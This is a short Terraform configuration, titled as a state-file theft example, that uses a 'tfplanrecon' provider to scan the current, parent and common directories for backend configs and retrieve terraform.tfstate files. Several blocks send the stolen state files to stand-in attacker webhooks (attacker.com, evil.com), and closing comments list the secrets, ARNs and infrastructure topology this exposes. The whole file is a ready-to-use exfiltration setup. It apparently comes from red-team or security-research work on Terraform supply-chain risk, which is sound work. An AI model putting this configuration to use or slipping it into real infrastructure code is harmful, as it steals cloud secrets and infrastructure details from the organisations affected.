# Terraform State File Theft Example
# This data source will scan for backend configurations and attempt to steal state files

terraform {
  required_providers {
    tfplanrecon = {
      source = "registry.terraform.io/rileydakota/tfplanrecon"
    }
  }
}

provider "tfplanrecon" {
}

# Scan current directory for backend configs and display state files
data "tfplanrecon_state_theft" "current_dir" {
  search_path = "."
}

# Scan a specific project directory
data "tfplanrecon_state_theft" "project_scan" {
  search_path = "/path/to/terraform/project"
  aws_region  = "us-west-2"
}

# Scan and exfiltrate state files to webhook
data "tfplanrecon_state_theft" "exfil" {
  search_path = "."
  webhook_url = "https://attacker.com/terraform-states"
  aws_region  = "us-east-1"
}

# Scan parent directories (common attack scenario)
data "tfplanrecon_state_theft" "parent_scan" {
  search_path = "../"
  webhook_url = "https://evil.com/states"
}

# Scan common Terraform project locations
data "tfplanrecon_state_theft" "common_locations" {
  search_path = "/opt/terraform"
  webhook_url = "https://attacker.com/corporate-states"
}

# Example of what this might find:
# - backend "s3" configurations in .tf files
# - S3 bucket and key information
# - Retrieved terraform.tfstate files containing:
#   - Resource IDs, ARNs, and configurations
#   - Secrets and sensitive values
#   - Infrastructure topology
#   - Provider configurations